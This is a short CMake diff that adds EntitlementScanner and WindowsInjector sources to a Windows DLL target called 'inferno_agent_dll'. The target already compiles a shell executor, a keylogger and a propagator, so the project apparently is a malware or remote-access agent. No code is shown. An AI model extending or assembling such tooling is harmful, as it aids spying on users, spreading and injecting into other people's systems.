@@ -153,6 +153,8 @@ if(WIN32)
         client/src/ShellExecutor.cpp
         client/src/KeyLogger.cpp
         client/src/Propagator.cpp
+        client/src/EntitlementScanner.cpp
+        client/src/WindowsInjector.cpp
     )
     target_include_directories(inferno_agent_dll PRIVATE client/include)
     target_compile_definitions(inferno_agent_dll PRIVATE INFERNO_DLL)
